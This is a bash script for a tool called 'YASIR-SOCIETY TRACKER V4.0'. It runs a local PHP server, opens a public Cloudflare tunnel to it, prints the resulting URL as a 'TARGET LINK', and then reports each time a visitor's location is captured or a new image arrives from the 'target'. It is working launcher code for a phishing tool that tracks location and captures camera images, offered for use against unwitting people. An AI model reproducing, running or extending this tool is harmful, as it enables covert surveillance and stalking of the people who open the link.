#!/bin/bash

# Colors
G='\033[1;32m' # Green
R='\033[1;31m' # Red
W='\033[1;37m' # White
B='\033[1;34m' # Blue
C='\033[1;36m' # Cyan
Y='\033[1;33m' # Yellow

# Typewriter Effect
typewrite() {
    text=$1
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${text:$i:1}"
        sleep 0.03
    done
    echo
}

cleanup() {
    echo -e "\n\n${R}[!] SYSTEM SHUTDOWN...${W}"
    killall php cloudflared > /dev/null 2>&1
    exit
}
trap cleanup SIGINT

clear
echo -e "${G}
  ██████╗  ██████╗ ██╗   ██╗███████╗██╗  ██╗
  ██╔══██╗██╔═══██╗██║   ██║██╔════╝╚██╗██╔╝
  ██████╔╝██║   ██║██║   ██║█████╗   ╚███╔╝ 
  ██╔══██╗██║   ██║╚██╗ ██╔╝██╔══╝   ██╔██╗ 
  ██║  ██║╚██████╔╝ ╚████╔╝ ███████╗██╔╝ ██╗
  ╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
${W}"

typewrite "${C}[*] BOOTING YASIR-SOCIETY TRACKER V4.0..."
typewrite "${C}[*] CONNECTING TO CLOUDFLARE SERVERS..."

# Start PHP & Tunnel
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
cloudflared tunnel --url http://127.0.0.1:3333 > .tunnel.log 2>&1 &
sleep 10

LINK=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' .tunnel.log)

echo -e "${Y}==========================================="
echo -e "${G} TARGET LINK : ${W}$LINK"
echo -e "${Y}===========================================${W}"
echo -e "${B}[*] WAITING FOR TARGET... (CTRL+C to EXIT)${W}\n"

last_log=0
last_img=$(ls *.png 2>/dev/null | wc -l)

while true; do
    # Check Logs
    if [ -f "logs.txt" ]; then
        current_log=$(wc -l < logs.txt)
        if [ "$current_log" -gt "$last_log" ]; then
            data=$(tail -n 1 logs.txt)
            if [[ "$data" == *"Denied"* ]]; then
                echo -e "${R}[!] ALERT: TARGET BLOCKED LOCATION PERMISSION!${W}"
            else
                echo -e "${G}[+] SUCCESS: TARGET LOCATION CAPTURED! ${W}"
                echo -e "${C} DATA: ${W}$data"
            fi
            last_log=$current_log
        fi
    fi

    # Check Photos
    current_img=$(ls *.png 2>/dev/null | wc -l)
    if [ "$current_img" -gt "$last_img" ]; then
        echo -e "${G}[+] SYSTEM: NEW IMAGE RECEIVED FROM TARGET!${W}"
        last_img=$current_img
    fi
    sleep 1
done
